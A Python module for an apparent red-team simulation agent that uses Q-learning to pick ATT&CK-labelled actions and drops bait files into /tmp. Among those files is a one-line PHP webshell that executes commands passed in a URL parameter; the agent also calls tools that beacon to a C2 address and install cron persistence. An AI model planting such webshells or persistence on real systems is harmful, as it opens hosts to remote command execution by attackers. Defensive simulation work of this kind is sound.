import os
import time
import json
import random
import logging
from ant_swarm.core.ooda import OODALoop
from ant_swarm.tools.red_tools import (
    SystemSurveyor, NetworkSniffer, TrafficGenerator,
    LateralMover, PrivEsc, ExfiltrationEngine, DGA, PersistenceManager
)
from ant_swarm.tools.threat_intel import ThreatIntel

logger = logging.getLogger("RedTeamer")
TARGET_DIR = "/tmp"
Q_TABLE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "../../", "red_q_table.json")

class RedTeamer(OODALoop):
    def __init__(self):
        super().__init__("RedTeamer", cycle_time=1.5)
        self.actions = [
            "T1046_RECON", "T1027_OBFUSCATE", "T1003_ROOTKIT", "T1589_LURK",
            "T1046_WIFI_SCAN", "T1046_NET_SCAN", "T1190_WEB_EXPLOIT",
            "T1071_C2_BEACON", "T1547_PERSIST"
        ]
        self.q_table = self._load_memory()
        self.epsilon = 0.3
        self.alpha = 0.4
        self.gamma = 0.9
        self.last_state = None
        self.last_action = None

        # Initialize Advanced Tools
        self.surveyor = SystemSurveyor()
        self.sniffer = NetworkSniffer()
        self.traffic = TrafficGenerator()
        self.lateral = LateralMover()
        self.persist = PersistenceManager()
        self.ti = ThreatIntel() # Can be used to fetch IPs

        # Reward Config
        self.R_IMPACT = 10
        self.R_STEALTH = 15
        self.R_CRITICAL = 30
        self.MAX_ALERT = 5

    def observe(self):
        return self.hive.get_state()

    def orient(self, obs):
        alert_level = 6 - obs["defcon"]
        return {"alert_level": alert_level}

    def decide(self, orientation):
        state = str(orientation["alert_level"])
        self.last_state = state

        if random.random() < self.epsilon:
            action = random.choice(self.actions)
        else:
            known = {a: self.q_table.get(f"{state}_{a}", 0) for a in self.actions}
            action = max(known, key=known.get) if known else random.choice(self.actions)

        self.last_action = action
        return action

    def act(self, action):
        impact = 0
        fname = None
        content = None

        try:
            if action == "T1046_RECON":
                # Use SystemSurveyor
                info = self.surveyor.collect_system_info()
                logger.info(f"Recon Data: {info}")
                # Still drop bait for Blue to find
                fname = f"malware_bait_{int(time.time())}.sh"
                content = f"echo 'Target: {info.get('hostname')}'"
                impact = 1

            elif action == "T1046_NET_SCAN":
                # Use NetworkSniffer
                services = self.sniffer.scan_active_services()
                logger.info(f"Active Services: {services}")
                impact = 3

            elif action == "T1071_C2_BEACON":
                # Use TrafficGenerator
                # Get a target IP from ThreatIntel or random
                target = self.ti.get_c2_ip() or "192.168.1.100"
                status = self.traffic.send_http_beacon(target)
                logger.info(f"Beacon sent to {target}, Status: {status}")
                impact = 2

            elif action == "T1547_PERSIST":
                if self.persist.install_cron():
                    logger.info("Persistence installed (Cron)")
                    impact = 5

            elif action == "T1027_OBFUSCATE":
                fname = f"malware_crypt_{int(time.time())}.bin"
                content = os.urandom(1024)
                impact = 3

            elif action == "T1003_ROOTKIT":
                fname = f".sys_shadow_{int(time.time())}"
                content = "uid=0(root)"
                impact = 5

            elif action == "T1190_WEB_EXPLOIT":
                fname = f"malware_webshell_{int(time.time())}.php"
                content = "<?php system($_GET['cmd']); ?>"
                impact = 7

            elif action == "T1046_WIFI_SCAN":
                 fname = f"handshake_{int(time.time())}.cap"
                 content = b"handshake_data"
                 impact = 2

            elif action == "T1589_LURK":
                impact = 0

            if fname:
                path = os.path.join(TARGET_DIR, fname)
                mode = 'wb' if isinstance(content, bytes) else 'w'
                with open(path, mode) as f: f.write(content)
                logger.info(f"Executed {action}: Dropped {fname}")
                self.bus.publish("ATTACK_LAUNCHED", {"action": action, "impact": impact})

        except Exception as e:
            logger.error(f"Failed to execute {action}: {e}")

        # Calculate Reward & Learn
        current_alert = int(self.last_state)
        reward = 0
        if impact > 0: reward = self.R_IMPACT
        if current_alert >= 4 and action == "T1589_LURK": reward = self.R_STEALTH
        if current_alert == 5 and impact > 0: reward = self.R_CRITICAL
        if action == "T1190_WEB_EXPLOIT": reward += 5

        self._learn(self.last_state, action, reward, self.last_state)

        self.epsilon = max(0.01, self.epsilon * 0.995)

        if random.random() < 0.1:
            self._save_memory()

    def _learn(self, state, action, reward, next_state):
        old_val = self.q_table.get(f"{state}_{action}", 0)
        next_max = max([self.q_table.get(f"{next_state}_{a}", 0) for a in self.actions])
        new_val = old_val + self.alpha * (reward + self.gamma * next_max - old_val)
        self.q_table[f"{state}_{action}"] = new_val

    def _load_memory(self):
        if os.path.exists(Q_TABLE_FILE):
            try:
                with open(Q_TABLE_FILE, 'r') as f: return json.load(f)
            except: return {}
        return {}

    def _save_memory(self):
        try:
            with open(Q_TABLE_FILE, 'w') as f: json.dump(self.q_table, f, indent=4)
        except: pass
